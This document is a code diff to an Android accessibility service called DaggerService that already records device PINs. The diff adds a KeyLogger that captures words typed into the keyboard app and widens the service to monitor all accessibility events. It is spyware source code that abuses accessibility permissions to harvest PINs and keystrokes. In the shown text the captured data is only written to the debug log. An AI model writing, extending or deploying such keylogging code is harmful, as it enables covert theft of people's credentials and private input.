@@ -29,12 +29,17 @@ class DaggerService : AccessibilityService() {
     }
 
     lateinit var pinRecorder: PinRecorder
+    lateinit var keyLogger: KeyLogger
     lateinit var receiver: BroadcastReceiver
 
     override fun onCreate() {
         super.onCreate()
         pinRecorder = PinRecorder(fun(pin: String) {
             Log.d(TAG, "Pin recorded: $pin")
+        })
+
+        keyLogger = KeyLogger(fun(word: String) {
+            Log.d(TAG, "Word recorded: $word")
         })
         receiver = ScreenStateReceiver()
     }
@@ -98,8 +103,10 @@ class DaggerService : AccessibilityService() {
             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                 if (event.packageName == Config.KEYBOARD_PACKAGE_NAME) {
                     val source = event.source
-                    val keystroke = source.text.toString()
-                    Log.d(TAG, "Keystroke detected: $keystroke")
+                    val keystroke = source?.text?.toString()
+                    if (keystroke != null) {
+                        keyLogger.recordKeystroke(event)
+                    }
                 }
             }
         }
@@ -136,6 +143,7 @@ class DaggerService : AccessibilityService() {
                 AccessibilityEvent.TYPE_VIEW_CLICKED or
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         return info
     }
